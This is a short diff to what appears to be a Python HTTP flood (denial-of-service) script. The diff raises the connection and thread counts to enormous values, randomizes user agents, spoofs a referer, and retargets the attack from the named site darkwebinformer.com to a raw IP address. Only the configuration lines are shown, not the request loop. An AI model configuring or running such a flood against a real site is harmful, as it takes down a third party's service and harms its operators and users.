@@ -4,9 +4,9 @@ import time
 import random
 from fake_useragent import UserAgent
 
-connections_per_thread = 500000000000
-num_threads = 50000000000000
-url = "https://darkwebinformer.com/"
+connections_per_thread = 50000000000000000
+num_threads = 50000000000000000
+url = "http://104.21.64.1/"
 
 referers = [
     "https://darkwebinformer.com/"
